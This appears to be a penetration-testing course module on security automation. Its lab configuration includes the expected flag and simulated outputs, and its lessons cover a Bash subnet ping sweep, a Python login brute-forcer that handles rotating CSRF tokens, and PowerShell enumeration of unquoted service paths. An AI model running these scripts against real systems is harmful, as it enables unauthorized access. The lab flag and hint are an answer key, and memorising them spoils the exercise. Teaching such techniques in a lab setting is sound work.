---
id: mod-pt-103
track_id: track-pentest
slug: security-automation-bash-python-powershell
title: '103: Security Automation via Bash, Python & PowerShell'
difficulty: Fundamentals
order_index: 4
estimated_minutes: 35
lab_type: terminal
lab_briefing: Target 10.10.14.30 exposes an administrative portal (/login) that rotates a hidden anti-CSRF token on every HTTP request, blocking standard wordlists. Run the Bash CIDR recon wrapper, inspect the anti-CSRF response headers, and execute the stateful Python CSRF brute-force script to authenticate as svc_deploy and retrieve the automation flag.
expected_flag: FLAG{STATEFUL_CSRF_PYTHON_AUTOMATION}
hint: Execute python3 csrf_bruteforce.py (Step 3) to parse the rotating CSRF tokens and extract FLAG{STATEFUL_CSRF_PYTHON_AUTOMATION}.
lab_config:
  target_ip: 10.10.14.30
  quick_commands:
    - ./recon_sweep.sh 10.10.14.0/24
    - curl -s http://10.10.14.30/login | grep csrf_token
    - python3 csrf_bruteforce.py --target http://10.10.14.30/login --user svc_deploy --wordlist /usr/share/wordlists/corp_top10.txt
  commands:
    ./recon_sweep.sh 10.10.14.0/24: |-
      | Host IP      | Status | Open TCP Ports     | Service Banner                  |
      | ------------ | ------ | ------------------ | ------------------------------- |
      | 10.10.14.10  | UP     | 22/tcp             | OpenSSH 9.2p1 Debian            |
      | 10.10.14.30  | UP     | 80/tcp, 31337/tcp  | Gunicorn/22.0 (CSRF-Protected)  |
    curl -s http://10.10.14.30/login | grep csrf_token: '  <input type="hidden" name="csrf_token" value="9f8a77b1e4c20019d8a2f5b3c1e099a4" />'
    python3 csrf_bruteforce.py --target http://10.10.14.30/login --user svc_deploy --wordlist /usr/share/wordlists/corp_top10.txt: |-
      [*] Initializing stateful requests.Session() with rate-limit (5 req/s)...
      [-] Attempt 1: svc_deploy:Welcome1! (CSRF: 4a1b9c...) -> 403 Invalid Credentials
      [-] Attempt 2: svc_deploy:Spring2026! (CSRF: 8f3e2d...) -> 403 Invalid Credentials
      [+] Attempt 3: svc_deploy:Phoenix#Ops99 (CSRF: 7c91a0...) -> 200 OK (Session Established!)
      [+] Extracted Dashboard Secret: FLAG{STATEFUL_CSRF_PYTHON_AUTOMATION}
---

# 103: Security Automation via Bash, Python & PowerShell

## Sub-Unit 3.1: Offensive Bash Scripting & Recon Tool Chaining

Systems administrators write Bash scripts for backups and log rotation; penetration testers write Bash wrappers to chain `nmap`, `masscan`, `dig`, and `whois` into automated reconnaissance pipelines that output structured Markdown tables directly into their engagement notes:

```bash
#!/usr/bin/env bash
for ip in $(seq 1 254); do
  ping -c 1 -W 1 "10.10.14.$ip" &>/dev/null && echo "| 10.10.14.$ip | UP |" &
done; wait
```
Using background subshells (`&`) with `wait` parallelizes host discovery across a `/24` subnet in under 2 seconds.

## Sub-Unit 3.2: Python for Stateful Web Automation & Custom Socket Fuzzing

Standard brute-forcing tools often fail when a web application rotates **anti-CSRF tokens** on every HTTP response or requires multi-step custom TCP handshakes. Using Python's `requests.Session()` and `socket` libraries allows you to maintain cookie state, parse dynamic CSRF tokens via regex before each POST attempt, and control thread concurrency (`concurrent.futures`) so fragile services never crash:

```python
import requests, re

s = requests.Session()
for pwd in ['Admin2025!', 'Winter2026!', 'Phoenix#Ops99']:
    r = s.get('http://10.10.14.30/login')
    csrf = re.search(r'name="csrf_token" value="([^"]+)"', r.text).group(1)
    resp = s.post('http://10.10.14.30/login', data={'user': 'svc_deploy', 'pass': pwd, 'csrf_token': csrf})
    if 'Invalid' not in resp.text:
        print(f'[+] Authenticated with {pwd}: {resp.text}')
```

## Sub-Unit 3.3: Offensive PowerShell & Living-off-the-Land (LotL)

On Windows targets where Antivirus/EDR blocks third-party binaries, native PowerShell object pipelines (`Where-Object`, `Select-Object`), WMI/CIM queries (`Get-CimInstance`), and ADSI LDAP searchers (`[adsisearcher]`) allow full domain share and local administrator enumeration entirely in memory:
```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -eq 'LocalSystem' -and $_.PathName -notlike '"*'}
```
